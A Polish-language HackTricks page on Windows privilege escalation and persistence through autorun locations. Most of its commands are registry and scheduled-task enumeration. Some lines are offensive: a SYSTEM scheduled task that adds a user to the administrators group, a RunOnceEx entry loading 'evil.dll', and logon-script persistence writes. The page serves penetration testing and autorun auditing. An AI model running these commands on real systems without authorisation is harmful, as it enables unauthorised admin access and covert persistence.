# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** może być używany do uruchamiania programów podczas **startup**. Sprawdź, które binaria są zaprogramowane do uruchamiania podczas startup za pomocą:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zaplanowane zadania

**Tasks** mogą być zaplanowane do uruchamiania z **określoną częstotliwością**. Zobacz, które binaria są zaplanowane do uruchomienia za pomocą:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Foldery

Wszystkie binaria znajdujące się w **folderach Startup będą uruchamiane przy starcie**. Powszechne foldery startup to te wymienione poniżej, ale folder startup jest wskazywany w rejestrze. [Przeczytaj to, aby dowiedzieć się gdzie.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Vulnerabilities typu *path traversal* przy ekstrakcji archiwów (takie jak ta nadużywana w WinRAR przed 7.13 – CVE-2025-8088) mogą zostać wykorzystane do **umieszczenia payloads bezpośrednio w tych folderach Startup podczas dekompresji**, co skutkuje wykonaniem code execution przy następnym logon użytkownika.  Po szczegółowe omówienie tej techniki zobacz:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Wpis rejestru **Wow6432Node** wskazuje, że używasz 64-bitowej wersji Windows. Operating system używa tego klucza, aby wyświetlać oddzielny widok HKEY_LOCAL_MACHINE\SOFTWARE dla 32-bitowych aplikacji działających na 64-bitowych wersjach Windows.

### Runs

**Powszechnie znane** registry AutoRun:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry keys znane jako **Run** i **RunOnce** są przeznaczone do automatycznego uruchamiania programów za każdym razem, gdy użytkownik loguje się do systemu. Linia poleceń przypisana jako wartość danych klucza jest ograniczona do 260 znaków lub mniej.

**Service runs** (can control automatic startup of services during boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Na Windows Vista i nowszych wersjach klucze rejestru **Run** i **RunOnce** nie są generowane automatycznie. Wpisy w tych kluczach mogą bezpośrednio uruchamiać programy albo wskazywać je jako dependencies. Na przykład, aby załadować plik DLL przy logon, można użyć klucza rejestru **RunOnceEx** wraz z kluczem "Depend". Jest to pokazane przez dodanie wpisu rejestru, który wykonuje "C:\temp\evil.dll" podczas system start-up:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Jeśli możesz zapisywać wewnątrz dowolnego z wymienionych wpisów registry w **HKLM**, możesz podnieść uprawnienia, gdy zaloguje się inny użytkownik.

> [!TIP]
> **Exploit 2**: Jeśli możesz nadpisać dowolny z binary wskazanych w którymkolwiek z wpisów registry w **HKLM**, możesz zmodyfikować ten binary, dodając backdoor, gdy zaloguje się inny użytkownik, i podnieść uprawnienia.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Skróty umieszczone w folderze **Startup** automatycznie uruchomią usługi lub aplikacje podczas logowania użytkownika albo ponownego uruchomienia systemu. Lokalizacja folderu **Startup** jest zdefiniowana w rejestrze zarówno dla zakresu **Local Machine**, jak i **Current User**. Oznacza to, że każdy skrót dodany do tych wskazanych lokalizacji **Startup** spowoduje uruchomienie powiązanej usługi lub programu po procesie logowania lub restartu, co czyni to prostą metodą planowania automatycznego uruchamiania programów.

> [!TIP]
> Jeśli możesz nadpisać dowolny \[User] Shell Folder w **HKLM**, będziesz mógł wskazać go na folder kontrolowany przez ciebie i umieścić backdoor, który będzie wykonywany za każdym razem, gdy użytkownik loguje się do systemu, eskalując uprawnienia.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Ta wartość rejestru per-user może wskazywać na skrypt lub polecenie, które jest uruchamiane, gdy ten użytkownik się loguje. Jest to głównie prymityw **persistence**, ponieważ działa tylko w kontekście dotkniętego użytkownika, ale nadal warto to sprawdzać podczas post-exploitation i przeglądu autoruns.

> [!TIP]
> Jeśli możesz zapisać tę wartość dla bieżącego użytkownika, możesz ponownie wywołać wykonanie przy następnym interaktywnym logowaniu bez potrzeby uprawnień admin rights. Jeśli możesz zapisać ją dla hive innego użytkownika, możesz uzyskać code execution, gdy ten użytkownik się zaloguje.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Uwagi:

- Preferuj pełne ścieżki do `.bat`, `.cmd`, `.ps1` lub innych plików uruchamiających, które są już czytelne dla użytkownika docelowego.
- To przetrwa logoff/reboot, dopóki wartość nie zostanie usunięta.
- W przeciwieństwie do `HKLM\...\Run`, to **nie** daje samo w sobie elevation; to persistence na poziomie użytkownika.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Zwykle klucz **Userinit** jest ustawiony na **userinit.exe**. Jednak jeśli ten klucz zostanie zmodyfikowany, określony executable zostanie również uruchomiony przez **Winlogon** podczas logon użytkownika. Podobnie, klucz **Shell** ma wskazywać na **explorer.exe**, który jest domyślną shell dla Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Jeśli możesz nadpisać wartość rejestru albo binary, będziesz w stanie podnieść uprawnienia.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Sprawdź klucz **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Zmiana Command Prompt w Safe Mode

W Windows Registry w `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, znajduje się wartość **`AlternateShell`** ustawiona domyślnie na `cmd.exe`. Oznacza to, że gdy wybierasz "Safe Mode with Command Prompt" podczas uruchamiania (naciskając F8), używany jest `cmd.exe`. Jednak możliwe jest skonfigurowanie komputera tak, aby automatycznie uruchamiał się w tym trybie bez potrzeby naciskania F8 i ręcznego wybierania tej opcji.

Kroki, aby utworzyć boot option do automatycznego uruchamiania w "Safe Mode with Command Prompt":

1. Zmień atrybuty pliku `boot.ini`, aby usunąć flagi read-only, system i hidden: `attrib c:\boot.ini -r -s -h`
2. Otwórz `boot.ini` do edycji.
3. Wstaw linię podobną do: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Zapisz zmiany w `boot.ini`.
5. Przywróć oryginalne atrybuty pliku: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Zmiana klucza rejestru **AlternateShell** pozwala na konfigurację niestandardowej powłoki poleceń, potencjalnie do nieautoryzowanego dostępu.
- **Exploit 2 (PATH Write Permissions):** Posiadanie uprawnień zapisu do dowolnej części systemowej zmiennej **PATH**, zwłaszcza przed `C:\Windows\system32`, pozwala uruchomić niestandardowy `cmd.exe`, co może działać jak backdoor, jeśli system zostanie uruchomiony w Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Dostęp do zapisu w `boot.ini` umożliwia automatyczne uruchomienie Safe Mode, ułatwiając nieautoryzowany dostęp przy następnym restarcie.

Aby sprawdzić bieżące ustawienie **AlternateShell**, użyj tych poleceń:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup to funkcja w Windows, która **uruchamia się przed pełnym załadowaniem środowiska pulpitu**. Nadaje priorytet wykonaniu określonych poleceń, które muszą się zakończyć, zanim będzie kontynuowany logon użytkownika. Proces ten zachodzi nawet przed uruchomieniem innych wpisów startowych, takich jak te w sekcjach rejestru Run lub RunOnce.

Active Setup jest zarządzany przez następujące klucze rejestru:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

W tych kluczach istnieją różne podklucze, z których każdy odpowiada za konkretny komponent. Wartości kluczowe, które są szczególnie istotne, obejmują:

- **IsInstalled:**
- `0` oznacza, że polecenie komponentu nie zostanie wykonane.
- `1` oznacza, że polecenie zostanie wykonane raz dla każdego użytkownika, co jest domyślnym zachowaniem, jeśli wartość `IsInstalled` jest pominięta.
- **StubPath:** Definiuje polecenie, które ma zostać wykonane przez Active Setup. Może to być dowolna poprawna linia poleceń, na przykład uruchomienie `notepad`.

**Security Insights:**

- Modyfikacja lub zapis do klucza, w którym **`IsInstalled`** ma ustawioną wartość `"1"` wraz z konkretnym **`StubPath`**, może prowadzić do nieautoryzowanego wykonania poleceń, potencjalnie w celu privilege escalation.
- Zmiana pliku binarnego wskazanego przez dowolną wartość **`StubPath`** również może umożliwić privilege escalation, przy wystarczających uprawnieniach.

Aby sprawdzić konfiguracje **`StubPath`** we wszystkich komponentach Active Setup, można użyć tych poleceń:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Przegląd Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) to moduły DLL, które dodają dodatkowe funkcje do Microsoft Internet Explorer. Ładują się do Internet Explorer i Windows Explorer przy każdym uruchomieniu. Ich wykonanie można jednak zablokować, ustawiając klucz **NoExplorer** na 1, co uniemożliwia ich ładowanie wraz z instancjami Windows Explorer.

BHOs są kompatybilne z Windows 10 poprzez Internet Explorer 11, ale nie są obsługiwane w Microsoft Edge, domyślnej przeglądarce w nowszych wersjach Windows.

Aby sprawdzić BHOs zarejestrowane w systemie, możesz przejrzeć następujące klucze rejestru:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Każdy BHO jest reprezentowany w rejestrze przez swój **CLSID**, który służy jako unikalny identyfikator. Szczegółowe informacje o każdym CLSID można znaleźć w `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Do zapytań o BHOs w rejestrze można użyć tych poleceń:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Rozszerzenia Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Zauważ, że registry będzie zawierać 1 nowy wpis registry dla każdej dll i będzie on reprezentowany przez **CLSID**. Informacje o CLSID znajdziesz w `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Otwórz Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opcje wykonywania plików obrazu
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Zauważ, że wszystkie miejsca, w których można znaleźć autoruns, są **już przeszukiwane przez**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Jednak dla **bardziej kompletnej listy plików uruchamianych automatycznie** możesz użyć [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) z systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Więcej

**Znajdź więcej Autoruns podobnych do rejestrów w** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## References

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
